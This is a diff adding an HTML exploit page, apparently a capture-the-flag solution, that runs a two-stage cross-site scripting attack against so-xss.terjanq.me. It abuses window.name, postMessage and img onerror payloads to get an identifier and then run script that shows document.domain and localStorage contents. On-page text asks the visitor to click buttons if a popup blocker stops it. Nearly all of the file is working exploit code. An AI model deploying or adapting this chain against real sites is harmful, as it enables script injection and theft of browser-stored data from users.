@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <iframe
+            id="iframe"
+            sandbox='allow-scripts allow-popups'
+        >
+        </iframe>
+        <script>
+            const sleep = (d) => new Promise(r => setTimeout(r, d)); 
+            const iframePwn = async () => {
+                const sleep = (d) => new Promise(r => setTimeout(r, d)); 
+                let w = window.open("https://so-xss.terjanq.me/iframe.php", "window.opener.postMessage(identifier, '*');");
+                await sleep(1500);
+                w.postMessage({type: "render", body: "<img src=x onerror='eval(window.name);'>"}, "*");
+
+                window.onmessage = (e) => {
+                    window.top.postMessage(e.data, "*");
+                };
+            };
+            
+            const pwn = () => {
+                let fn = `(` + iframePwn.toString() + `)()`;
+                document.getElementById("iframe").srcdoc = `<script>` + fn + `</scr` + `ipt>`;
+            }
+
+            let identifier;
+
+            window.onmessage = (e) => {
+                identifier = e.data;
+                pwn2();
+            };
+
+            const pwn2 = async () => {
+                let w = window.open("https://so-xss.terjanq.me");
+                await sleep(2000);
+                w.frames[0].postMessage({type: "render", identifier, body: "<img src=x onerror='alert(document.domain + `\n` + localStorage.html);'>"}, "*");
+            };
+
+            window.onload = pwn;
+        </script>
+        <h1>if this doesn't work automatically bc of popup blocker, can you pls press these two buttons in order? thanks :></h1>
+        <button onclick='pwn()'>stage1</button>
+        <button onclick='pwn2()'>stage2</button>
+    </body>
+</html>
